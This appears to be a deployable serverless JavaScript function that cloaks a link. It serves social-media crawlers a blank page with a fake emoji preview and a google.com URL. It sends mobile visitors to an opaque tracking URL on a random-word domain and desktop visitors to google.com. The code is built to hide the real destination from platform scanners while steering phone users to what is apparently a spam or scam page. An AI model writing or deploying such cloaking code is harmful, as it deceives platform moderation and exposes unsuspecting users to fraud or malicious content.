export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Tue-Sep-15-2026/4db81987-a572-480b-a07e-433e50b17237/d02808db-6224-44a8-8830-fa84399dbc4f.jpg">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/eWooXl9/dJC8HxAM9/Ef7wy9/ykVpgC-YbpccwRfMVk/v2SC7nRYEyj/zJ_O62s5M/7if7bHX2NL/ymmR1onhE/USPpOh7fgnXg2VndDp/X0FCMm_6KE/Pi0c1aq1ElvL/Mo5/Gqq1tN/3", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
